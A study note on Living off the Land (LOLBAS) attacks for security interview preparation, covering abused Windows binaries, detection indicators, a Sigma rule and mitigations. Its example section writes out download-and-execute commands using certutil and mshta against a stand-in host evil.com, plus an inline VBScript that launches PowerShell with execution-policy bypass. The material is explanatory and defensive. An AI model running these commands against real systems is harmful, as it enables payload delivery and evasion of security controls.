---
tags:
  - "#cybersecurity/red-team/evasion"
  - "#cybersecurity/blue-team/detection"
  - "#interview/concepts"
aliases:
  - LOLBAS
  - LOLBins
  - Living off the Land Binaries
  - LOTL
  - Living off the Land
---

# Living off the Land (LOLBAS)

> **One-liner:** Attack technique using legitimate, pre-installed system binaries to execute malicious actions, evading detection by blending in with normal activity.

## 🎯 What Is It?
Living off the Land Binaries, Scripts, and Libraries (LOLBAS) refers to the abuse of trusted, signed Windows binaries that are already present on systems. Attackers use these tools to download payloads, execute code, bypass security controls, and maintain persistence—all without dropping custom malware to disk.

## 🤔 Why It Matters
- **Evasion:** These binaries are signed by Microsoft and trusted by default
- **Fileless:** Attacks can occur entirely in memory with no malware on disk
- **Detection Challenge:** Hard to distinguish malicious use from legitimate admin activity
- **Ubiquitous:** Every Windows system has these tools pre-installed

## 📊 Common LOLBAS Binaries

| Binary | Legitimate Purpose | Malicious Abuse |
|--------|-------------------|-----------------|
| `mshta.exe` | Run HTA applications | Execute VBScript/JS payloads |
| `powershell.exe` | Scripting/automation | Download & execute payloads |
| `certutil.exe` | Certificate management | Download files, decode Base64 |
| `rundll32.exe` | Run DLL functions | Execute malicious DLLs |
| `regsvr32.exe` | Register COM objects | Execute remote scriptlets |
| `wmic.exe` | WMI queries | Process creation, lateral movement |
| `msiexec.exe` | Install MSI packages | Execute remote MSI payloads |
| `bitsadmin.exe` | Background transfers | Stealthy file downloads |

## 🔬 How It Works

### Attack Pattern
```
Attacker gains initial access (e.g., phishing)
              ↓
Drops minimal stager (or uses macro/HTA)
              ↓
Stager calls LOLBAS binary with malicious args
              ↓
LOLBAS binary performs attacker's action
              ↓
Blends with legitimate system activity
```

### Example: certutil.exe Download
```powershell
# Legitimate use
certutil -verify certificate.cer

# Malicious use - download payload
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
```

### Example: mshta.exe Remote Execution
```powershell
# Execute remote HTA file
mshta.exe http://evil.com/payload.hta

# Execute inline VBScript
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"":close")
```

## 🛡️ Detection & Prevention

### How to Detect
- **Command-line monitoring:** Look for unusual arguments to trusted binaries
- **Parent-child relationships:** `mshta.exe` → `powershell.exe` is suspicious
- **Network connections:** `certutil.exe` making HTTP requests is abnormal
- **Frequency analysis:** Rare use of `regsvr32.exe` warrants investigation

### Detection Indicators

| Binary | Suspicious Indicator |
|--------|---------------------|
| `certutil.exe` | `-urlcache`, `-decode`, URLs in args |
| `mshta.exe` | Spawns child processes, network connections |
| `powershell.exe` | `-enc`, `-nop`, `-w hidden`, `IEX`, `DownloadString` |
| `rundll32.exe` | JavaScript/VBScript in command line |
| `regsvr32.exe` | `/s /n /u /i:http://` pattern |

### Sigma Rule Example
```yaml
title: Certutil Download
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'http'
  condition: selection
```

### How to Prevent / Mitigate
- Application whitelisting with strict rules
- Windows Defender Attack Surface Reduction (ASR) rules
- Constrained Language Mode for PowerShell
- Block outbound connections from LOLBAS binaries at firewall
- Script Block Logging for PowerShell

## 🎤 Interview Angles

### Common Questions
- "What is Living off the Land and why is it effective?"
- "Name 3 LOLBAS binaries and how they can be abused"
- "How would you detect LOLBAS-based attacks in your environment?"

### STAR Story
> **Situation:** EDR flagged `certutil.exe` making an outbound HTTP connection on a developer workstation.
> **Task:** Determine if this was a legitimate use or malicious activity.
> **Action:** Reviewed command-line arguments showing `-urlcache -f` with an external URL. Traced back to a phishing email with a macro-enabled document. Isolated the host and extracted the downloaded payload for analysis.
> **Result:** Identified new C2 infrastructure, blocked at firewall, and created detection for this certutil pattern across the fleet.

## ✅ Best Practices for Blue Teams
- Baseline normal LOLBAS usage in your environment
- Focus on command-line arguments, not just process names
- Correlate with network telemetry
- Use the LOLBAS project as a reference for detection engineering

## 🔗 Related Concepts
- [[HTA (HTML Application)]]
- [[mshta.exe]]
- [[Command and Control (C2)]]
- [[Detection Engineering]]
- [[Privilege Escalation]]
- [[MITRE ATT&CK]]

## 📚 References
- LOLBAS Project: https://lolbas-project.github.io/
- MITRE ATT&CK - Signed Binary Proxy Execution: https://attack.mitre.org/techniques/T1218/
